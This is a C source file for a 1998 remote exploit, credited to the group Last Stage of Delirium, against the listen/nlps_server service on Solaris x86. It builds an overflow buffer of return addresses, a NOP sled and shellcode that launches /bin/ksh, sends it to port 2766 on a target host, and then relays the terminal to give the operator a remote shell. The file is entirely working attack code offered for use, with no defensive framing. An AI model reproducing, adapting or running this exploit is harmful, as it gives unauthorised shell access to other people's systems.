/*## copyright LAST STAGE OF DELIRIUM apr 1998 poland        *://lsd-pl.net/ #*/
/*## listen/nlps_server                                                      #*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>

#define ADRNUM 256
#define NOPNUM 64+46+7+4

char adr[4]="\x30\x79\x04\x08";

char shellcode[]=
    "\xeb\x1b"             /* jmp     <shellcode+30>       */
    "\x33\xd2"             /* xorl    %edx,%edx            */
    "\x58"                 /* popl    %eax                 */
    "\x8d\x78\x14"         /* leal    0x14(%eax),edi       */
    "\x52"                 /* pushl   %edx                 */
    "\x57"                 /* pushl   %edi                 */
    "\x50"                 /* pushl   %eax                 */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x92"                 /* xchgl   %eax,%edx            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x88\x42\x08"         /* movb    %al,0x8(%edx)        */
    "\x83\xef\x3c"         /* subl    $0x3c,%edi           */
    "\xb0\x9a"             /* movb    $0x9a,%al            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x47"                 /* incl    %edi                 */
    "\xb0\x07"             /* movb    $0x7,%al             */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\xb0\x3b"             /* movb    $0x3b,%al            */
    "\xe8\xe0\xff\xff\xff" /* call    <shellcode+2>        */
    "/bin/ksh"
;

main(int argc,char **argv){
    char buffer[1024],*b; 
    int sck,i;
    struct sockaddr_in address;
    struct hostent *hp;

    printf("copyright LAST STAGE OF DELIRIUM apr 1998 poland  //lsd-pl.net/\n");
    printf("listen/nlps_server for solaris 2.4 2.5 2.5.1 x86\n\n");

    if(argc!=2){
        printf("usage: %s address\n",argv[0]);exit(1);
    }
    sck=socket(AF_INET,SOCK_STREAM,0);
    bzero(&address,sizeof(address));
    address.sin_family=AF_INET;
    address.sin_port=htons(2766);
    if((address.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            printf("error: address.\n");exit(-1);
        }
        memcpy(&address.sin_addr.s_addr,hp->h_addr,4);
    }
    if(connect(sck,(struct sockaddr *)&address,sizeof(address))<0){
        perror("error");exit(-1);
    }
 
    sprintf(buffer,"NLPS:002:002:");
    b=&buffer[13];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    for(i=0;i<NOPNUM;i++) *b++=0x90;
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    for(i=0;i<(14+ADRNUM+NOPNUM+strlen(shellcode)+1);i++)
        printf("%02x",(unsigned char)buffer[i]);
    fflush(stdout);

    write(sck,buffer,14+ADRNUM+NOPNUM+strlen(shellcode)+34+1);
    write(sck,"yahoo...\n",9);

    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
}